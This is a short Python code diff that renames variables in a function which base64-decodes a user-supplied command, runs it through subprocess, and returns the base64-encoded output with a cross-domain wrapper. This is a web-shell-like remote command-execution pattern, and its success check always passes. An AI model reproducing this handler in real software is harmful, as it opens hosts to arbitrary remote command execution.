@@ -41,8 +41,8 @@ def is_master():
     数据路由，判断master ip
     :return: 0/1?None
     '''
-    data = read_flag_file()
-    return corss_domain(data)
+    flag = read_flag_file()
+    return corss_domain(flag)
 
 global GLO_CMD_RESULT
 
@@ -53,13 +53,13 @@ def oprt_ex_cmd(cmd):
     :param cmd: 用户输入命令
     :return: 执行结果
     '''
-    cmd_str = base64.b64decode(cmd)
+    decrypt_cmd_result = base64.b64decode(cmd)
     global GLO_CMD_RESULT
 
-    if subprocess.getstatusoutput(cmd_str):
-        cmd_result = subprocess.getoutput(cmd_str)
-        data_value = base64.b64encode(cmd_result.encode('utf-8'))
-        GLO_CMD_RESULT = data_value.decode()
+    if subprocess.getstatusoutput(decrypt_cmd_result):
+        cmd_result = subprocess.getoutput(decrypt_cmd_result)
+        encrypt_cmd_result = base64.b64encode(cmd_result.encode('utf-8'))
+        GLO_CMD_RESULT = encrypt_cmd_result.decode()
         str_ok = "命令执行成功"
         return corss_domain(str_ok)
     else:
